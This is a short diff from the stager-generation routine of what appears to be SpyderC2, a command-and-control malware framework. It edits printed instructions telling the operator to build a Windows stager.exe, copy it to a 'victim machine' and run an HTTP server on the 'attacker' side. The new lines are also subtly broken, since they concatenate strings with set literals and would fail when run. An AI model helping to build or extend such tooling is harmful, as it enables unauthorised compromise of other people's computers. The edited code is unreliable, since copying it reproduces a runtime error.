@@ -75,9 +75,9 @@ def generate_stager():
 
 		if not docker():
 			subprocess.check_output('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows ', cwd=rf"{os.path.join(PATH,'tmp')}",shell=True)
-			print(colored("exe dumped to ./tmp/dist/windows.Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
+			print(colored(f"exe dumped to {colored('<path_to_SpyderC2>/data/tmp/dist/windows','cyan')}.Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
 		else:
-			print(colored('Please run the following command: '+colored('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows','cyan')+' in <path_to_SpyderC2>/data/tmp directory on the host machine. The stager will be generated in <path_to_SpyderC2>/data/tmp/dist/windows. Copy it to your victim machine, once generated.Do run a HTTP server on attacker by running http command before executing stager.exe.'))
+			print(colored("Please run the following command:"+ {colored('sudo docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-windows','cyan')}+" in "+{colored('<path_to_SpyderC2>/data/tmp','cyan')}+" directory on the host machine. The stager will be generated in"+ {colored('<path_to_SpyderC2>/data/tmp/dist/windows','cyan')}+". Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe on victim."))
 	except subprocess.CalledProcessError as grepexc:                                                                                                   
 		print(colored(f"exe generation failed ","red"))
 
